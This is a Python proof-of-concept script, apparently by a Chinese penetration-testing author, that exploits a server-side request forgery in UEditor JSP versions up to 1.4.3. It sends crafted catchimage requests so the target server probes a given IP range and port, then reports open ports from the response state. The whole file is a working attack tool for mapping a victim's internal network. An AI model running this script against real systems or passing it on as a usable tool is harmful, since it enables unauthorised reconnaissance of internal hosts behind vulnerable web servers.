#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
# Author: 浮萍
# Write by afei00123

import json, requests, argparse
from IPy import IP

def title():
    print('*'.center(50, '*'))
    print("UEditor_jsp <= 1.4.3".center(50))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: https://afei00123.blog.csdn.net/".center(50))
    print("公众号：网络运维渗透".center(40))
    print('*'.center(50, '*'))
    print("")

def Ueditor_SSRF_POC(url, ip, port):
    url = "{0}/jsp/controller.jsp?action=catchimage&source[]=http://{1}:{2}/0f3927bc-5f26-11e8-9c2d-fa7ae01bbebc.png".format(url, ip, port)
    res = requests.get(url).text
    res = res.replace("list", "\"list\"")
    res_json = json.loads(res)
    state = res_json['list'][0]['state']
    if state == "远程连接出错" or state == "SUCCESS":
        print("{0}:{1} is open".format(ip, port))
        print("")

def check_IP(url, ip, port):
    ips = IP(ip)
    for i in ips:
        Ueditor_SSRF_POC(url, i, port)
    print("端口探测完成")

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="Ueditor_SSRF_jsp-env_POC Script")
    parser.add_argument(
    '-u', '--url',
    metavar='', required='True',
    help = 'Please input target url. eg: -u http://ip:port, --url http://ip:port'
    )
    parser.add_argument(
        '-H', '--ip',
        metavar='', required='True',
        help='Please input IP or segment. eg: -H 10.0.0.0/8, --ip 10.0.0.0/8'
    )
    parser.add_argument(
        '-p', '--port',
        metavar='', required='True',
        help='Please input target port. eg: -d 8080, --port 8080'
    )
    args = parser.parse_args()
    check_IP(args.url, args.ip, args.port)